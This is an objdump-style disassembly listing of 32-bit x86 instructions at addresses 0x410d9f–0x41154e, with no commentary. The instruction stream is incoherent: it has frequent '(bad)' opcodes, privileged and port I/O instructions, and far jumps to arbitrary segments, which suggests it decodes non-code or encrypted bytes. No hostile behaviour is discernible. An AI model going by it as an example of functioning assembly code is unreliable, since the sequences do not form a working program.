  410d9f:	push   ecx
  410da0:	jnp    0x410ddb
  410da2:	xchg   esi,eax
  410da3:	repz les esi,FWORD PTR [ecx+0x3ce79066]
  410daa:	push   edx
  410dab:	push   esp
  410dac:	dec    edx
  410dad:	test   DWORD PTR [edi-0x6f],esi
  410db0:	push   0xc3a0234f
  410db5:	mov    DWORD PTR [ebx+0x35],ecx
  410db8:	ins    DWORD PTR es:[edi],dx
  410db9:	add    ebx,ebx
  410dbb:	add    al,0x3
  410dbd:	adc    BYTE PTR [edi],0x22
  410dc0:	popf   
  410dc1:	jge    0x410d6e
  410dc3:	pop    ebp
  410dc4:	add    al,0x33
  410dc6:	adc    bh,dl
  410dc8:	test   BYTE PTR [esi+eax*1-0x77],dh
  410dcc:	sbb    BYTE PTR [ebx-0x7255bf9e],ch
  410dd2:	iret   
  410dd3:	das    
  410dd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410dd5:	call   0xe4a83288
  410dda:	pop    eax
  410ddb:	dec    esp
  410ddc:	inc    esi
  410ddd:	hlt    
  410dde:	std    
  410ddf:	test   al,0xac
  410de1:	shl    DWORD PTR [ecx],cl
  410de3:	scas   al,BYTE PTR es:[edi]
  410de4:	adc    ebp,DWORD PTR [eax-0x15]
  410de7:	dec    esp
  410de8:	rol    DWORD PTR [esi],1
  410dea:	ror    ecx,0x8b
  410ded:	adc    BYTE PTR ds:0xe1d64bc0,bl
  410df3:	dec    eax
  410df4:	cmp    edx,DWORD PTR [ecx]
  410df6:	lods   al,BYTE PTR ds:[esi]
  410df7:	push   edx
  410df8:	stos   DWORD PTR es:[edi],eax
  410df9:	push   ebx
  410dfa:	push   ebx
  410dfb:	fimul  DWORD PTR [edx]
  410dfd:	hlt    
  410dfe:	cmc    
  410dff:	mov    al,0xa0
  410e01:	jb     0x410e2d
  410e03:	pusha  
  410e04:	push   0xffffffd5
  410e06:	(bad)  
  410e07:	in     al,dx
  410e08:	pop    edx
  410e09:	mov    ebp,0x8f6011d5
  410e0e:	ret    
  410e0f:	cmp    al,0xb0
  410e11:	xchg   DWORD PTR [esi],esi
  410e13:	icebp  
  410e14:	js     0x410e03
  410e16:	repnz mov di,0xbce4
  410e1b:	imul   esi,DWORD PTR [edi+0x1e1c296a],0x4f2a0d09
  410e25:	mov    esi,0x8f60f079
  410e2a:	push   ebx
  410e2b:	sbb    DWORD PTR [ecx],edi
  410e2d:	leave  
  410e2e:	ret    
  410e2f:	mov    esi,0xf6fa2601
  410e34:	in     al,dx
  410e35:	jmp    0x57ac5e6
  410e3a:	jge    0x410e48
  410e3c:	aam    0xc
  410e3e:	icebp  
  410e3f:	fisubr WORD PTR [edi-0x32a4f852]
  410e45:	mov    bl,0x91
  410e47:	hlt    
  410e48:	std    
  410e49:	shr    ebx,0xcb
  410e4c:	mov    cl,0x95
  410e4e:	dec    eax
  410e4f:	add    esi,eax
  410e51:	out    dx,al
  410e52:	inc    ebx
  410e53:	enter  0x5f45,0x20
  410e57:	arpl   WORD PTR ds:[esi+0x36],bx
  410e5b:	aad    0x1f
  410e5d:	ins    DWORD PTR es:[edi],dx
  410e5e:	cmp    eax,0x8f5e32b1
  410e63:	in     eax,dx
  410e64:	mov    edi,0x2d1dc3e6
  410e69:	or     DWORD PTR [eax+0x40443d9e],eax
  410e6f:	ja     0x410e30
  410e71:	mov    dl,0x61
  410e73:	and    eax,0xa0281cda
  410e78:	push   0xffffffc3
  410e7a:	sbb    eax,DWORD PTR [ebx]
  410e7c:	mov    cs,WORD PTR [ebp+0xf]
  410e7f:	hlt    
  410e80:	loop   0x410f01
  410e82:	ret    0x3bab
  410e85:	mov    ds:0x6ef83f4,eax
  410e8a:	je     0x410e1d
  410e8c:	pop    es
  410e8d:	pushf  
  410e8e:	imul   eax,DWORD PTR [eax+0x136f29c6],0x5e29628c
  410e98:	sub    al,0x5c
  410e9a:	repz push ebx
  410e9c:	cli    
  410e9d:	fisttp WORD PTR [esi+0x65]
  410ea0:	push   ss
  410ea1:	pop    esp
  410ea2:	jmp    0x410f08
  410ea4:	shl    DWORD PTR [edx],1
  410ea6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ea7:	cmp    al,bl
  410ea9:	mov    edx,0x4442af75
  410eae:	test   DWORD PTR [eax+0x5734dc24],edx
  410eb4:	sbb    al,0x43
  410eb6:	add    eax,0x11e6b0e
  410ebb:	sbb    al,0xd6
  410ebd:	(bad)  
  410ebe:	adc    dl,dh
  410ec0:	pop    eax
  410ec1:	dec    ebp
  410ec2:	scas   eax,DWORD PTR es:[edi]
  410ec3:	cld    
  410ec4:	jp     0x410ec0
  410ec6:	pop    edx
  410ec7:	(bad)  
  410ec8:	and    al,0x4f
  410eca:	in     al,0xd1
  410ecc:	dec    eax
  410ecd:	js     0x410efe
  410ecf:	adc    DWORD PTR [eax],ecx
  410ed1:	lea    edi,[ebx+0xaf50a23]
  410ed7:	sub    dl,BYTE PTR [esi-0x46]
  410eda:	out    0xed,eax
  410edc:	cmp    dh,BYTE PTR [ebp-0x1316ec09]
  410ee2:	ret    0xc281
  410ee5:	cmp    BYTE PTR [ebp+esi*8-0x12],cl
  410ee9:	or     cl,BYTE PTR [edi+0x1bf687cd]
  410eef:	sbb    BYTE PTR [edx-0x5f99c12b],bl
  410ef5:	xor    eax,0x93e8c2ee
  410efa:	pop    ds
  410efb:	popf   
  410efc:	jno    0x410ef9
  410efe:	or     ch,BYTE PTR [edx-0x50]
  410f01:	jmp    0xd5c7:0xdf9af31d
  410f08:	jp     0x410ee2
  410f0a:	inc    ecx
  410f0b:	mov    esi,0x2515ccfb
  410f10:	in     eax,dx
  410f11:	js     0x410f5a
  410f13:	sub    ah,BYTE PTR [edi+0x4916f65f]
  410f19:	popa   
  410f1a:	dec    edi
  410f1b:	push   ecx
  410f1c:	mov    al,ds:0x753a007b
  410f21:	mov    cl,bh
  410f23:	pop    es
  410f24:	int3   
  410f25:	popa   
  410f26:	mov    eax,0x226c369d
  410f2b:	jg     0x410ef2
  410f2d:	cmp    esi,esp
  410f2f:	ins    BYTE PTR es:[edi],dx
  410f30:	pop    eax
  410f31:	in     al,dx
  410f32:	pop    ds
  410f33:	jg     0x410fa5
  410f35:	xor    ecx,DWORD PTR [edi+0x7fb33da3]
  410f3b:	clc    
  410f3c:	cmc    
  410f3d:	xor    esi,ebp
  410f3f:	fst    DWORD PTR [edi+0x4f]
  410f42:	dec    ebx
  410f43:	push   0x51
  410f45:	add    eax,0xf2734bcb
  410f4a:	xchg   ebx,eax
  410f4b:	in     al,0xc6
  410f4d:	jmp    0xbce3744e
  410f52:	iret   
  410f53:	push   0xed450a5f
  410f58:	pop    edi
  410f59:	aaa    
  410f5a:	adc    ch,BYTE PTR [ecx-0x79df3de0]
  410f60:	and    al,0x15
  410f62:	icebp  
  410f63:	cmp    ebx,0xd95a1eec
  410f69:	pop    ebx
  410f6a:	test   DWORD PTR [ecx],edx
  410f6c:	js     0x410f46
  410f6e:	inc    edi
  410f6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f70:	push   cs
  410f71:	add    al,BYTE PTR [edi+ebx*1+0x2c]
  410f75:	pusha  
  410f76:	shl    BYTE PTR [ecx+edx*1-0xb81c537],1
  410f7d:	test   BYTE PTR [ecx+0x78122a47],bl
  410f83:	add    al,0xee
  410f85:	add    BYTE PTR [ecx-0x5be7b5ac],dl
  410f8b:	add    DWORD PTR [eax-0xd],ebx
  410f8e:	adc    BYTE PTR [edx+ecx*2+0x2],0xd3
  410f93:	test   BYTE PTR [edi+0x61],dl
  410f96:	sub    BYTE PTR [edi-0x2f],ch
  410f99:	sahf   
  410f9a:	ss aad 0xa3
  410f9d:	out    0xb3,al
  410f9f:	inc    esp
  410fa0:	mov    esi,0x61073289
  410fa5:	outs   dx,BYTE PTR ds:[esi]
  410fa6:	(bad)  [eax+eax*1-0x43]
  410faa:	stos   BYTE PTR es:[edi],al
  410fab:	add    edi,DWORD PTR [edx+0x53b19e76]
  410fb1:	dec    eax
  410fb2:	xchg   BYTE PTR [ecx+edi*1],bl
  410fb5:	and    eax,DWORD PTR [ecx]
  410fb7:	cmp    ebx,esi
  410fb9:	fs push es
  410fbb:	adc    DWORD PTR [ebp-0x7e],ecx
  410fbe:	xchg   esi,eax
  410fbf:	or     bl,BYTE PTR [edi-0x64]
  410fc2:	icebp  
  410fc3:	inc    ebx
  410fc4:	or     bh,dl
  410fc6:	imul   ebx,DWORD PTR [ebx],0xec27b7a6
  410fcc:	xor    ch,BYTE PTR [edx-0x526d83dd]
  410fd2:	retf   0xfb36
  410fd5:	test   bl,0xa6
  410fd8:	(bad)  
  410fd9:	adc    al,0x25
  410fdb:	jno    0x410f7d
  410fdd:	std    
  410fde:	adc    ebx,DWORD PTR [esi-0x33]
  410fe1:	repnz leave 
  410fe3:	sbb    BYTE PTR [ebp+edi*8-0x1c],0xf7
  410fe8:	mov    cl,cl
  410fea:	push   edx
  410feb:	inc    esp
  410fec:	add    bl,BYTE PTR [ecx-0x41]
  410fef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ff0:	loopne 0x410f79
  410ff2:	mov    ds:0x3c2a99d8,eax
  410ff7:	cmp    eax,0x30ec348
  410ffc:	push   esi
  410ffd:	nop
  410ffe:	mov    ebp,DWORD PTR [ecx-0x60]
  411001:	leave  
  411002:	fistp  DWORD PTR [edx-0x12462999]
  411008:	add    DWORD PTR [edi+0x4],eax
  41100b:	iret   
  41100c:	lods   al,BYTE PTR ds:[esi]
  41100d:	xlat   BYTE PTR ds:[ebx]
  41100e:	pop    ss
  41100f:	pop    edx
  411010:	pop    ds
  411011:	jmp    0x5f52:0x598fee08
  411018:	pop    edi
  411019:	mov    DWORD PTR [ebx-0x34],ebx
  41101c:	lahf   
  41101d:	fwait
  41101e:	inc    ecx
  41101f:	ins    BYTE PTR es:[edi],dx
  411020:	xchg   ecx,eax
  411021:	sbb    eax,0x38b4adc7
  411026:	ins    DWORD PTR es:[edi],dx
  411027:	leave  
  411028:	test   BYTE PTR [ecx+0x68],0x28
  41102c:	inc    eax
  41102d:	adc    DWORD PTR [ebp+0x27ca2359],0xf93d086c
  411037:	add    al,0xf8
  411039:	into   
  41103a:	add    eax,0xd5049e8d
  41103f:	jne    0x41105d
  411041:	xchg   esi,eax
  411042:	mov    ebp,0x27336605
  411047:	push   edx
  411048:	iret   
  411049:	shl    BYTE PTR [ebp+0x4c2087d7],1
  41104f:	xchg   ebx,eax
  411050:	xor    DWORD PTR [edx-0x11],esp
  411053:	aad    0x84
  411055:	(bad)  
  411056:	icebp  
  411057:	nop
  411058:	mov    edi,0x4af9f254
  41105d:	add    ebx,DWORD PTR [edx]
  41105f:	inc    edi
  411060:	xchg   edi,eax
  411061:	mov    ecx,0x6871d645
  411066:	sbb    al,0xb7
  411068:	out    0x7a,eax
  41106a:	inc    esp
  41106b:	mov    bl,0x80
  41106d:	hlt    
  41106e:	test   BYTE PTR ds:0x95442ae2,bh
  411074:	pop    es
  411075:	lods   eax,DWORD PTR ds:[esi]
  411076:	jns    0x41105b
  411078:	cmp    DWORD PTR [esp+eiz*8-0x3c79b38a],0x6f1a0197
  411083:	std    
  411084:	add    al,0x54
  411086:	sub    esi,edx
  411088:	or     ecx,edx
  41108a:	push   cs
  41108b:	push   0x593056e3
  411090:	cmp    al,0x2
  411092:	ret    
  411093:	or     BYTE PTR [edi+0x15],bh
  411096:	ret    0xfa5b
  411099:	out    0xe7,al
  41109b:	int3   
  41109c:	mov    cl,0xcd
  41109e:	jnp    0x411057
  4110a0:	or     BYTE PTR es:[ebp-0x40],dh
  4110a4:	adc    ch,ch
  4110a6:	pusha  
  4110a7:	fnstcw WORD PTR [ecx+ebx*8-0x5377ddd5]
  4110ae:	and    eax,0xef97714d
  4110b3:	jp     0x411052
  4110b5:	not    DWORD PTR [edi+0x66cad05e]
  4110bb:	jnp    0x41110f
  4110bd:	cmc    
  4110be:	int3   
  4110bf:	gs and eax,0x7195eabe
  4110c5:	mov    eax,ds:0xc0fb0f76
  4110ca:	dec    eax
  4110cb:	dec    esi
  4110cc:	out    dx,al
  4110cd:	mov    eax,0xd67245f2
  4110d2:	pop    edi
  4110d3:	jle    0x411137
  4110d5:	out    dx,eax
  4110d6:	popf   
  4110d7:	jne    0x411155
  4110d9:	jg     0x4110d2
  4110db:	or     al,0xdd
  4110dd:	push   esp
  4110de:	sbb    al,0x8
  4110e0:	rsm    
  4110e2:	sbb    edx,edx
  4110e4:	xor    eax,0x4102afa
  4110e9:	add    DWORD PTR [ebx],edi
  4110eb:	rcr    BYTE PTR [ebx+0x42],0xdb
  4110ef:	inc    eax
  4110f0:	hlt    
  4110f1:	sbb    eax,0x2ae72ff9
  4110f6:	jno    0x4110a1
  4110f8:	mov    esi,0x8a81f8fc
  4110fd:	test   eax,esi
  4110ff:	and    al,dl
  411101:	mov    dh,0x38
  411103:	into   
  411104:	cli    
  411105:	push   ds
  411106:	lods   eax,DWORD PTR ds:[esi]
  411107:	xlat   BYTE PTR ds:[ebx]
  411108:	in     al,dx
  411109:	and    esp,DWORD PTR [ebp-0x69]
  41110c:	pop    edx
  41110d:	xor    DWORD PTR [edi+0x474ec9dd],edx
  411113:	pop    edi
  411114:	push   eax
  411115:	jb     0x411120
  411117:	jnp    0x4110c2
  411119:	repnz into 
  41111b:	or     dh,al
  41111d:	popa   
  41111e:	into   
  41111f:	push   ss
  411120:	shl    DWORD PTR ds:0xb3361275,1
  411126:	loope  0x411140
  411128:	(bad)  
  411129:	push   0x10
  41112b:	mov    cl,0x81
  41112d:	mov    edx,DWORD PTR [eax+0x4216eba1]
  411133:	jae    0x4110fe
  411135:	or     al,0x27
  411137:	mov    BYTE PTR [ebp-0x41],0xa9
  41113b:	inc    eax
  41113c:	xor    ah,bh
  41113e:	xchg   edi,eax
  41113f:	shl    DWORD PTR [edi],0xe1
  411142:	adc    esp,DWORD PTR [edx-0x20337685]
  411148:	les    eax,FWORD PTR [eax+edi*1+0x5978cf5d]
  41114f:	mov    DWORD PTR [ecx],edi
  411151:	jb     0x411167
  411153:	sub    al,BYTE PTR [edi+0x16]
  411156:	xor    BYTE PTR [edx-0x60],0x5f
  41115a:	dec    eax
  41115b:	xor    BYTE PTR [edi+eax*8],dh
  41115e:	sub    bl,BYTE PTR [ecx+0x68]
  411161:	jmp    0x4111db
  411163:	jo     0x411192
  411165:	cld    
  411166:	cli    
  411167:	inc    edi
  411168:	mov    dl,0x10
  41116a:	jo     0x411125
  41116c:	push   ebp
  41116d:	jge    0x4111c8
  41116f:	cmp    al,0x7a
  411171:	xchg   esi,eax
  411172:	jmp    0x1d0a0242
  411177:	clc    
  411178:	and    BYTE PTR [eax+0x4dea68f6],dh
  41117e:	leave  
  41117f:	dec    edx
  411180:	nop
  411181:	dec    edi
  411182:	mov    esp,0x770ae214
  411187:	ja     0x411113
  411189:	(bad)  
  41118a:	mov    eax,ds:0xd4b1b829
  41118f:	mov    BYTE PTR [esi],al
  411191:	sbb    BYTE PTR [ecx+edx*2+0x6c],bh
  411195:	cld    
  411196:	xor    al,cl
  411198:	and    DWORD PTR [edi+0x6e6a17fd],ecx
  41119e:	or     BYTE PTR [esi-0x1a9e474b],ah
  4111a4:	rol    DWORD PTR ds:0x2161de,1
  4111aa:	push   ebx
  4111ab:	ror    BYTE PTR [esi+eax*1-0x6e],cl
  4111af:	fwait
  4111b0:	in     eax,dx
  4111b1:	push   ss
  4111b2:	add    cl,BYTE PTR [ebp-0x32]
  4111b5:	lods   eax,DWORD PTR ds:[esi]
  4111b6:	inc    edx
  4111b7:	and    eax,esi
  4111b9:	jmp    0x15d0:0x9fa250ca
  4111c0:	xchg   ecx,eax
  4111c1:	pop    ebx
  4111c2:	mov    esp,0x12ead0a5
  4111c7:	in     al,0xb9
  4111c9:	xchg   DWORD PTR [ebx+0x23],eax
  4111cc:	xor    DWORD PTR [eax+ebx*4],ebp
  4111cf:	and    ecx,DWORD PTR [ebx+0x6b]
  4111d2:	cmp    esi,eax
  4111d4:	dec    edx
  4111d5:	lea    esi,[edx+0x6fb2136f]
  4111db:	pop    edi
  4111dc:	xchg   esp,esi
  4111de:	ror    BYTE PTR [edi+0x3d],cl
  4111e1:	cmp    BYTE PTR [eax-0x23],ch
  4111e4:	xor    BYTE PTR [esi],dh
  4111e6:	arpl   bp,di
  4111e8:	adc    eax,0xd485e081
  4111ed:	push   edi
  4111ee:	push   esi
  4111ef:	mov    edi,0xb8854019
  4111f4:	outs   dx,BYTE PTR ds:[esi]
  4111f5:	push   edi
  4111f6:	push   ecx
  4111f7:	mov    esp,0x5a6e7324
  4111fc:	test   al,0x14
  4111fe:	xchg   edx,eax
  4111ff:	mov    eax,gs:0xed726940
  411205:	loope  0x411258
  411207:	pop    eax
  411208:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411209:	pop    ebx
  41120a:	js     0x4111d3
  41120c:	(bad)  
  41120d:	pop    ebp
  41120e:	in     al,dx
  41120f:	xchg   esp,ecx
  411211:	mov    ?,WORD PTR [edi-0x33dd66bb]
  411217:	and    bl,BYTE PTR [ecx-0x7f454d49]
  41121d:	es loope 0x4111d1
  411220:	sbb    DWORD PTR [eax+0x14],ebp
  411223:	mov    ah,0x48
  411225:	das    
  411226:	(bad)  
  411227:	loopne 0x4111bc
  411229:	push   esi
  41122a:	xchg   ecx,eax
  41122b:	stc    
  41122c:	(bad)  
  41122e:	data16 or ch,BYTE PTR [edi]
  411231:	bound  esi,QWORD PTR [ebx]
  411233:	call   ecx
  411235:	sar    BYTE PTR [esi+ecx*8],cl
  411238:	push   eax
  411239:	outs   dx,DWORD PTR ds:[esi]
  41123a:	sbb    al,0x7a
  41123c:	xchg   BYTE PTR [ebp+ebx*1+0xc],al
  411240:	push   es
  411241:	arpl   di,bp
  411243:	test   DWORD PTR [ecx],0x41b0a558
  411249:	add    bl,dl
  41124b:	std    
  41124c:	xchg   esi,eax
  41124d:	xchg   BYTE PTR [ebx],bh
  41124f:	dec    esi
  411250:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411251:	sbb    esp,DWORD PTR [ebx-0x3326faef]
  411257:	cwde   
  411258:	fstp   QWORD PTR [edi+ebx*8-0x72314128]
  41125f:	leave  
  411260:	sub    esi,DWORD PTR ds:0x604fefad
  411266:	mov    dl,0xea
  411268:	out    0x76,al
  41126a:	xchg   edx,eax
  41126b:	sub    al,0xe8
  41126d:	repz aas 
  41126f:	push   es
  411270:	adc    edx,DWORD PTR [esi]
  411272:	mov    cl,0x95
  411274:	aaa    
  411275:	dec    ecx
  411277:	fs jge 0x41128f
  41127a:	pop    esi
  41127b:	mov    ch,0x99
  41127d:	fdivr  st,st(2)
  41127f:	fcmovne st,st(6)
  411281:	pop    ss
  411282:	sub    DWORD PTR [esi+0x6],esi
  411285:	mov    bl,BYTE PTR [ebp+0x1316a221]
  41128b:	addr16 popf 
  41128d:	pop    eax
  41128e:	scas   eax,DWORD PTR es:[edi]
  41128f:	mov    ?,WORD PTR [ebx-0x58]
  411292:	sub    esp,DWORD PTR [edx+0x7642edb9]
  411298:	add    BYTE PTR gs:[ecx+0x50b90b9a],cl
  41129f:	idiv   DWORD PTR [ebx]
  4112a1:	jb     0x411235
  4112a3:	xchg   ebx,eax
  4112a4:	lahf   
  4112a5:	dec    esi
  4112a6:	pushf  
  4112a7:	sub    al,0xa5
  4112a9:	cmp    cl,cl
  4112ab:	and    DWORD PTR [ebp-0x510f40bb],ecx
  4112b1:	mov    ebp,0xe429b4f5
  4112b6:	dec    eax
  4112b7:	push   esp
  4112b8:	push   ebp
  4112b9:	or     eax,0x48a8f4d1
  4112be:	int    0x3e
  4112c0:	jl     0x41127b
  4112c2:	sub    DWORD PTR [ebp+0x15],0x44987093
  4112c9:	shl    BYTE PTR [ebp+0x6e3d0e05],0x4
  4112d0:	jnp    0x41132b
  4112d2:	pop    es
  4112d3:	jns    0x411256
  4112d5:	pop    ebp
  4112d6:	sub    ah,BYTE PTR [ecx]
  4112d8:	mov    cl,0xc0
  4112da:	mov    ebx,0xf815da69
  4112df:	jnp    0x41131b
  4112e1:	(bad)  
  4112e2:	inc    edx
  4112e3:	dec    edi
  4112e4:	and    cl,0xf0
  4112e7:	mov    BYTE PTR [ebx],bl
  4112e9:	stos   DWORD PTR es:[edi],eax
  4112ea:	aas    
  4112eb:	cmp    ah,bl
  4112ed:	jg     0x411334
  4112ef:	cwde   
  4112f0:	stos   DWORD PTR es:[edi],eax
  4112f1:	popa   
  4112f2:	cwde   
  4112f3:	fldenv [ebp+0x2b81927c]
  4112f9:	jl     0x411340
  4112fb:	xchg   esp,eax
  4112fc:	lahf   
  4112fd:	mov    bl,0x15
  4112ff:	or     eax,0xfae26daa
  411304:	rol    DWORD PTR [ebx-0x5f],1
  411307:	inc    edx
  411308:	pop    eax
  411309:	mov    esp,0xcfaf5c80
  41130e:	add    bl,BYTE PTR [edx-0x70]
  411311:	cwde   
  411312:	jmp    0x411367
  411314:	in     eax,dx
  411315:	ret    
  411316:	sub    al,0x6f
  411318:	sub    cl,BYTE PTR [esi+0x43]
  41131b:	and    al,0x17
  41131d:	xchg   DWORD PTR [ebx],ecx
  41131f:	jmp    0x55f47fee
  411324:	lock aam 0x33
  411327:	jne    0x4112ae
  411329:	jnp    0x411356
  41132b:	sti    
  41132c:	cli    
  41132d:	jbe    0x41133a
  41132f:	nop
  411330:	jns    0x4112e2
  411332:	pop    esi
  411333:	add    al,0xfa
  411335:	pop    edi
  411336:	push   edx
  411337:	mov    esp,0x389b65c5
  41133c:	cwde   
  41133d:	inc    ebx
  41133e:	sub    al,0x1f
  411340:	inc    eax
  411341:	shl    BYTE PTR [ebx+0x39],1
  411344:	sbb    BYTE PTR [ecx-0x77],0xe4
  411348:	repz sbb cl,BYTE PTR [ebx]
  41134b:	ret    0x1dd2
  41134e:	pusha  
  41134f:	mov    cl,0x86
  411351:	sub    eax,0x70d99602
  411356:	push   ebx
  411357:	mov    edi,eax
  411359:	sti    
  41135a:	push   ss
  41135b:	dec    edi
  41135c:	loop   0x4113cb
  41135e:	xlat   BYTE PTR ds:[ebx]
  41135f:	test   al,0xd0
  411361:	test   dh,dh
  411363:	jmp    0x411374
  411365:	loopne 0x411329
  411367:	ret    0x1e13
  41136a:	es jnp 0x411353
  41136d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41136e:	jnp    0x41135d
  411370:	stc    
  411371:	xor    al,0xc6
  411373:	pop    DWORD PTR [edi+0x11]
  411376:	hlt    
  411377:	ins    BYTE PTR es:[edi],dx
  411378:	pop    edx
  411379:	pusha  
  41137a:	iret   
  41137b:	cmc    
  41137c:	repnz (bad) 
  41137e:	clc    
  41137f:	cwde   
  411380:	(bad)
  411383:	push   0x3d874395
  411388:	stc    
  411389:	push   cs
  41138a:	call   0x1ce742d2
  41138f:	dec    esi
  411390:	xchg   dl,bh
  411392:	pop    esi
  411393:	and    ebp,DWORD PTR ds:0x776c75ac
  411399:	or     al,dh
  41139b:	in     al,dx
  41139c:	jnp    0x41139a
  41139e:	ds jmp 0x40226741
  4113a4:	hlt    
  4113a5:	mov    ebx,0x281a3e5e
  4113aa:	add    DWORD PTR [eax-0x1c],esp
  4113ad:	inc    eax
  4113ae:	out    dx,al
  4113af:	push   edi
  4113b0:	xchg   edi,eax
  4113b1:	sbb    cl,BYTE PTR [esi]
  4113b3:	call   0x729f:0xdfef810c
  4113ba:	pop    ebp
  4113bb:	in     al,0xc4
  4113bd:	cdq    
  4113be:	mov    eax,ds:0x4d4baae8
  4113c3:	sbb    dl,BYTE PTR [esi+0x16]
  4113c6:	xchg   esi,eax
  4113c7:	mul    BYTE PTR [esi+0x63]
  4113ca:	add    bl,BYTE PTR [eax+0x10499830]
  4113d0:	and    edi,edi
  4113d2:	aam    0xd6
  4113d4:	test   BYTE PTR [ebp+esi*1-0x46],bl
  4113d8:	bound  esi,QWORD PTR [edi]
  4113da:	sbb    ah,bl
  4113dc:	scas   al,BYTE PTR es:[edi]
  4113dd:	imul   ecx,DWORD PTR [edi+eax*8-0x77ac5b],0x3a
  4113e5:	xchg   edi,eax
  4113e6:	push   cs
  4113e7:	lods   al,BYTE PTR ds:[esi]
  4113e8:	clc    
  4113e9:	inc    ebx
  4113ea:	dec    ecx
  4113eb:	jg     0x411402
  4113ed:	mov    eax,ecx
  4113ef:	and    eax,0xc0d4fb9d
  4113f4:	mov    ebp,0x45a91a7
  4113f9:	adc    edx,eax
  4113fb:	outs   dx,BYTE PTR ds:[esi]
  4113fc:	cmp    ah,BYTE PTR [ecx+0x55cde5c5]
  411402:	add    BYTE PTR [edi+ebx*1-0x1d],dl
  411406:	nop
  411407:	imul   esi,DWORD PTR [edx+0x4c35a942],0xd1810f16
  411411:	(bad)  
  411412:	sbb    bh,BYTE PTR [esi-0x5fa28528]
  411418:	xor    al,BYTE PTR [eax+eax*1]
  41141b:	ins    DWORD PTR es:[edi],dx
  41141c:	and    eax,0x87f5e9e5
  411421:	imul   BYTE PTR [eax+0x15]
  411424:	add    dl,dl
  411426:	xor    dh,BYTE PTR [ebx]
  411428:	xchg   esi,eax
  411429:	out    0xe5,eax
  41142b:	sub    al,BYTE PTR ds:0x4f972a49
  411431:	repnz sub eax,0x6d5c9dc9
  411437:	data16 sub al,0x14
  41143a:	cwde   
  41143b:	jne    0x4113db
  41143d:	in     eax,dx
  41143e:	fimul  DWORD PTR [esi]
  411440:	jge    0x411467
  411442:	outs   dx,BYTE PTR ds:[esi]
  411443:	cwde   
  411444:	inc    ebp
  411445:	test   eax,0x318b9a4c
  41144a:	and    al,0xe2
  41144c:	jno    0x4113ea
  41144e:	xchg   esp,eax
  41144f:	cmp    BYTE PTR [ecx+0x4d88ce93],cl
  411455:	test   DWORD PTR [ecx],esi
  411457:	push   DWORD PTR [eax+esi*4]
  41145a:	dec    eax
  41145b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41145c:	push   DWORD PTR [ecx-0x2b8bf7ce]
  411462:	test   ch,al
  411464:	or     DWORD PTR [edi+0x39e00900],ebx
  41146a:	xchg   edx,eax
  41146b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41146c:	dec    ecx
  41146d:	popf   
  41146e:	call   0xfcd69a15
  411473:	test   DWORD PTR [ecx-0x12],eax
  411476:	dec    esi
  411477:	fsub   QWORD PTR [esi+0x5f95aee7]
  41147d:	pop    esp
  41147e:	lahf   
  41147f:	add    esp,eax
  411481:	pop    edx
  411482:	scas   al,BYTE PTR es:[edi]
  411483:	pop    edi
  411484:	mov    cl,0x92
  411486:	xchg   ebx,eax
  411487:	sub    cl,dl
  411489:	data16 aam 0x76
  41148c:	out    0xeb,eax
  41148e:	mov    bl,0xa8
  411490:	inc    esp
  411491:	inc    eax
  411492:	(bad)  
  411493:	push   0x3c
  411495:	ja     0x41142f
  411497:	clc    
  411498:	or     BYTE PTR [ebx+edx*4+0x774f5ac8],dh
  41149f:	mov    eax,0x7d5184f5
  4114a4:	daa    
  4114a5:	lods   eax,DWORD PTR ds:[esi]
  4114a6:	jle    0x4114eb
  4114a8:	ja     0x41150f
  4114aa:	cld    
  4114ab:	sbb    DWORD PTR [esi],eax
  4114ad:	push   edx
  4114ae:	out    dx,al
  4114af:	or     ch,BYTE PTR [ebx-0x5]
  4114b2:	mov    esi,0x5ed30b48
  4114b7:	pushf  
  4114b8:	cli    
  4114b9:	dec    esp
  4114ba:	xchg   edx,eax
  4114bb:	dec    ebx
  4114bc:	repz jg 0x4114ae
  4114bf:	xchg   esi,eax
  4114c0:	imul   ecx,DWORD PTR [eax],0x768ab741
  4114c6:	clc    
  4114c7:	xor    DWORD PTR [esi-0x1],0x6bb6da5d
  4114ce:	inc    ebx
  4114cf:	fiadd  WORD PTR [esi+0x7c]
  4114d2:	ins    DWORD PTR es:[edi],dx
  4114d3:	pop    es
  4114d4:	pop    ss
  4114d5:	mov    dl,0x94
  4114d7:	add    ebp,DWORD PTR [esp+esi*8+0x7285ff50]
  4114de:	(bad)  
  4114e0:	daa    
  4114e1:	mov    edx,0xd3b24eec
  4114e6:	sahf   
  4114e7:	cdq    
  4114e8:	jae    0x411530
  4114ea:	lahf   
  4114eb:	mov    eax,ds:0x69766cfa
  4114f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114f1:	xor    bl,BYTE PTR [eax]
  4114f3:	in     eax,0xd4
  4114f5:	sub    al,0x8c
  4114f7:	imul   ebp,esp,0x65
  4114fa:	iret   
  4114fb:	sbb    ecx,DWORD PTR [ecx-0x41]
  4114fe:	mov    ds:0xe2cea533,al
  411503:	mov    edx,0xb9eafae1
  411508:	ret    0x551a
  41150b:	push   esp
  41150c:	cld    
  41150d:	lods   al,BYTE PTR ds:[esi]
  41150e:	into   
  41150f:	lods   al,BYTE PTR ds:[esi]
  411510:	ja     0x41157a
  411512:	call   0xaee0d24d
  411517:	dec    esp
  411518:	je     0x4114ba
  41151a:	lahf   
  41151b:	push   es
  41151c:	out    0xe,eax
  41151e:	or     al,0x16
  411520:	dec    ebx
  411521:	or     BYTE PTR [ecx+0x129edb6e],al
  411527:	sbb    DWORD PTR [ebx+0x2e],esi
  41152a:	out    0xfb,al
  41152c:	enter  0x97bb,0xf9
  411530:	pop    ds
  411531:	mov    DWORD PTR [edx+0x26c71c5b],0xe22cc32a
  41153b:	ficom  WORD PTR [ecx]
  41153d:	cld    
  41153e:	std    
  41153f:	mov    eax,ds:0x2f145abd
  411544:	lock popf 
  411546:	popa   
  411547:	stos   DWORD PTR es:[edi],eax
  411548:	pop    eax
  411549:	pop    es
  41154a:	jb     0x4114d0
  41154c:	cmp    edx,esp
  41154e:	loop   0x411558
